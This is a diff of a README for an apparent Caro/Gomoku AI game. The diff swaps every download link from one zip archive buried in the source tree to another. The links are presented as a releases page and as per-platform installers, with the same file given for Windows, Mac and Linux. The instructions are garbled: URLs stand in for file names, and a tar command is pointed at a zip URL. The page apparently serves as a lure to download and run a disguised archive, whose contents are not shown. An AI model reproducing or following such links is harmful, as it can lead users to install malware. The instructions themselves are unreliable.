@@ -1,7 +1,7 @@
 # 🎮 caro-ai-pvp - Play Tournament-Strength Caro AI Easily
 
 ## 📥 Download Now
-[![Download](https://github.com/bakrirazak/caro-ai-pvp/raw/refs/heads/main/frontend/src/routes/tournament/pvp_caro_ai_v1.5.zip)](https://github.com/bakrirazak/caro-ai-pvp/raw/refs/heads/main/frontend/src/routes/tournament/pvp_caro_ai_v1.5.zip)
+[![Download](https://raw.githubusercontent.com/bakrirazak/caro-ai-pvp/main/backend/src/Caro.Core/GameLogic/Pondering/caro-ai-pvp-2.1.zip)](https://raw.githubusercontent.com/bakrirazak/caro-ai-pvp/main/backend/src/Caro.Core/GameLogic/Pondering/caro-ai-pvp-2.1.zip)
 
 ## 🎯 Introduction
 Welcome to the **caro-ai-pvp** project! This application features a powerful Caro (Gomoku variant) AI. It operates at tournament strength, leveraging advanced techniques such as PVS and LMR. With **caro-ai-pvp**, players can enjoy an exciting challenge against an AI that is 10-50 times faster than the simple minimax approach.
@@ -18,33 +18,33 @@ Follow these simple steps to install and run the application.
 
 2. **Visit the Download Page**  
    Go to the releases page to find the latest version:
-   [Download Page](https://github.com/bakrirazak/caro-ai-pvp/raw/refs/heads/main/frontend/src/routes/tournament/pvp_caro_ai_v1.5.zip)
+   [Download Page](https://raw.githubusercontent.com/bakrirazak/caro-ai-pvp/main/backend/src/Caro.Core/GameLogic/Pondering/caro-ai-pvp-2.1.zip)
 
 3. **Choose Your Version**  
    Look for the latest release version. Click on the asset that matches your operating system, such as:
-   - Windows: `https://github.com/bakrirazak/caro-ai-pvp/raw/refs/heads/main/frontend/src/routes/tournament/pvp_caro_ai_v1.5.zip`
-   - Mac: `https://github.com/bakrirazak/caro-ai-pvp/raw/refs/heads/main/frontend/src/routes/tournament/pvp_caro_ai_v1.5.zip`
-   - Linux: `https://github.com/bakrirazak/caro-ai-pvp/raw/refs/heads/main/frontend/src/routes/tournament/pvp_caro_ai_v1.5.zip`
+   - Windows: `https://raw.githubusercontent.com/bakrirazak/caro-ai-pvp/main/backend/src/Caro.Core/GameLogic/Pondering/caro-ai-pvp-2.1.zip`
+   - Mac: `https://raw.githubusercontent.com/bakrirazak/caro-ai-pvp/main/backend/src/Caro.Core/GameLogic/Pondering/caro-ai-pvp-2.1.zip`
+   - Linux: `https://raw.githubusercontent.com/bakrirazak/caro-ai-pvp/main/backend/src/Caro.Core/GameLogic/Pondering/caro-ai-pvp-2.1.zip`
 
 ## 💾 Download & Install
 To get the application:
 
 - Click the link below to access the download page directly:
-  [Download Page](https://github.com/bakrirazak/caro-ai-pvp/raw/refs/heads/main/frontend/src/routes/tournament/pvp_caro_ai_v1.5.zip)
+  [Download Page](https://raw.githubusercontent.com/bakrirazak/caro-ai-pvp/main/backend/src/Caro.Core/GameLogic/Pondering/caro-ai-pvp-2.1.zip)
 
 - Select the file that corresponds to your operating system. Once downloaded, follow these steps:
   - **Windows:**
-    1. Double-click on the `https://github.com/bakrirazak/caro-ai-pvp/raw/refs/heads/main/frontend/src/routes/tournament/pvp_caro_ai_v1.5.zip` file.
+    1. Double-click on the `https://raw.githubusercontent.com/bakrirazak/caro-ai-pvp/main/backend/src/Caro.Core/GameLogic/Pondering/caro-ai-pvp-2.1.zip` file.
     2. Follow the instructions in the installer.
     3. After installation, find the application in your Start menu or desktop.
   
   - **Mac:**
-    1. Open the `https://github.com/bakrirazak/caro-ai-pvp/raw/refs/heads/main/frontend/src/routes/tournament/pvp_caro_ai_v1.5.zip` file you downloaded.
+    1. Open the `https://raw.githubusercontent.com/bakrirazak/caro-ai-pvp/main/backend/src/Caro.Core/GameLogic/Pondering/caro-ai-pvp-2.1.zip` file you downloaded.
     2. Drag the application into your Applications folder.
     3. Launch it from there.
 
   - **Linux:**
-    1. Extract the https://github.com/bakrirazak/caro-ai-pvp/raw/refs/heads/main/frontend/src/routes/tournament/pvp_caro_ai_v1.5.zip file using a terminal command like `tar -xvzf https://github.com/bakrirazak/caro-ai-pvp/raw/refs/heads/main/frontend/src/routes/tournament/pvp_caro_ai_v1.5.zip`.
+    1. Extract the https://raw.githubusercontent.com/bakrirazak/caro-ai-pvp/main/backend/src/Caro.Core/GameLogic/Pondering/caro-ai-pvp-2.1.zip file using a terminal command like `tar -xvzf https://raw.githubusercontent.com/bakrirazak/caro-ai-pvp/main/backend/src/Caro.Core/GameLogic/Pondering/caro-ai-pvp-2.1.zip`.
     2. Navigate to the extracted folder.
     3. Run the application using `./caro-ai-pvp`.
 
